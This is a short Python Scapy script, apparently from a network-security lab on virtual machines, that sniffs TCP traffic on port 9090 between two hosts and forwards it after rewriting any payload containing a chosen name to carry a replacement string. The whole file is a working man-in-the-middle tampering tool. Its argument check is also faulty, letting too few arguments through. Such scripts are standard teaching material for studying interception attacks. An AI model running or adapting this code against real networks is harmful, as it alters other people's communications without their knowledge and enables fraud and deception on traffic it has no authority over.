#!/usr/bin/python3
from scapy.all import *
import sys

if len(sys.argv) > 5:
	sys.exit('Usage: sudo python3 task3.py [VM A] [VM B] [name] [replacement]')

A=sys.argv[1]
B=sys.argv[2]
name=sys.argv[3]
replacement=sys.argv[4]
A_MAC='08:00:27:ed:2d:85'
B_MAC='08:00:27:92:75:4b'
SELF_MAC='08:00:27:bc:f5:3d'

def spoof(pkt):
	if pkt[IP].src == A and pkt[IP].dst == B and pkt[Ether].src== A_MAC:
		if pkt[TCP].payload:
			#data=bytes(pkt[TCP].payload).decode('utf-8')
			if name in pkt[TCP].payload.load.decode('utf-8'):
				print('A->B [spoofing]', '[ACK]', pkt[TCP].ack, '[SEQ]', pkt[TCP].seq)
				
				ipLayer=IP(bytes(pkt[IP]))
				del(ipLayer.chksum)
				del(ipLayer[IP].chksum)
				del(ipLayer[TCP].chksum)
				del(ipLayer[TCP].payload)
				data = pkt[TCP].payload.load.decode('utf-8')
				newdata=data.replace(name, replacement).encode()
				newpkt=ipLayer/newdata
				print(data,'->',newpkt[Raw].load)
				send(newpkt,verbose=0)
			else:
				print('A->B', '[ACK]', pkt[TCP].ack, '[SEQ]', pkt[TCP].seq)
				send(pkt[IP],verbose=0)
	elif pkt[IP].src == B and pkt[IP].dst == A and pkt[Ether].src == B_MAC:
		print('B->A', '[ACK]', pkt[TCP].ack, '[SEQ]', pkt[TCP].seq)
		send(pkt[IP],verbose=0)	
	
sniff(filter='tcp and port 9090 and host 10.0.2.9 and host 10.0.2.7', prn=spoof)
